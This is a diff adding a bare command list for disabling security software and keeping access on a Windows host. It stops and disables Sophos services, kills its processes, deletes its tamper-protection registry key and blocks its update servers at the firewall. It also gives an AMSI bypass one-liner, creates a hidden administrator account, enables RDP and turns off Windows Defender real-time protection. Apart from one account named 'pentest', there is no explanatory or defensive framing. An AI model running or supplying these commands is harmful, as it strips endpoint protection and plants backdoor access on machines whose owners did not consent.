@@ -1,0 +1,37 @@
+Stop-Service -Name "Sophos Anti-Virus" -Force
+Stop-Service -Name "Sophos MCS Client" -Force
+Stop-Service -Name "Sophos Web Control Service" -Force
+
+If services restart automatically, disable them:
+
+Set-Service -Name "Sophos Anti-Virus" -StartupType Disabled
+
+taskkill /IM "SophosUI.exe" /F
+taskkill /IM "SAVAdminService.exe" /F
+
+
+Deleting Registry Keys (Disable Tamper Protection Manually)
+
+reg delete "HKLM\SOFTWARE\Sophos\Management\TamperProtection" /f
+
+Network Bypass via Firewall Blocking
+
+New-NetFirewallRule -DisplayName "Block Sophos" -Direction Outbound -Program "C:\Program Files\Sophos\Sophos UI.exe" -Action Block
+
+
+Or block Sophos servers:
+netsh advfirewall firewall add rule name="Block Sophos Updates" dir=out action=block remoteip=52.5.76.199,34.248.93.211
+
+AMSI Bypass to Evade PowerShell Detection
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+----------------------------------------
+1. Create a Hidden Admin Account
+net user pentest P@ssw0rd! /add
+net localgroup Administrators pentest /add
+
+Enable RDP for Remote Access
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+Disable Windows Defender as a Backup
+Set-MpPreference -DisableRealtimeMonitoring $true
